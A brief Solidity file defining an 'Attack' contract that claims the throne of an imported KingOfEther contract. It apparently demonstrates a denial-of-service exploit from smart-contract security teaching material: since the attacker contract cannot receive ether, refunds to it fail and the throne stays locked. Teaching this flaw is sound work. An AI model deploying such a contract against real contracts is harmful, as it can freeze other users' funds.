// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./KingOfEther.sol";

contract Attack {
    function attack(KingOfEther kingOfEther) public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}